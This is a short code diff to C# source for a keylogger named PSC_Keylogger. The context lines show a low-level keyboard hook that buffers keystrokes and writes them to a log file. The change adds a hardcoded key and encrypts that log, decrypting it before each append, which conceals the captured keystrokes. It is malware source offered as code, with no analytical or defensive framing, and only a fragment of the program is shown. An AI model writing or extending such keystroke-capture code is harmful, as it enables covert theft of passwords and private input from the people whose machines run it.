@@ -27,6 +27,7 @@ namespace PSC_Keylogger
         public static LowLevelKeyboardProc llkProcedure = HookCallback;
 
         private static string buffer = "";
+        public static string KEY_ENCRYPTION = "bfghdeuq";
 
         public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
@@ -35,9 +36,16 @@ namespace PSC_Keylogger
 
             if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG)
             {
+                FileInfo logFile2 = new FileInfo(LOG_FILE_NAME);
+                if (logFile2.Exists)
+                {
+                    EncryptionManager.DecryptFile(LOG_FILE_NAME, KEY_ENCRYPTION);
+                }
+
                 StreamWriter output = new StreamWriter(LOG_FILE_NAME, true);
                 output.Write(buffer);
                 output.Close();
+                EncryptionManager.EncryptFile(LOG_FILE_NAME, KEY_ENCRYPTION);
                 buffer = "";
             }
 
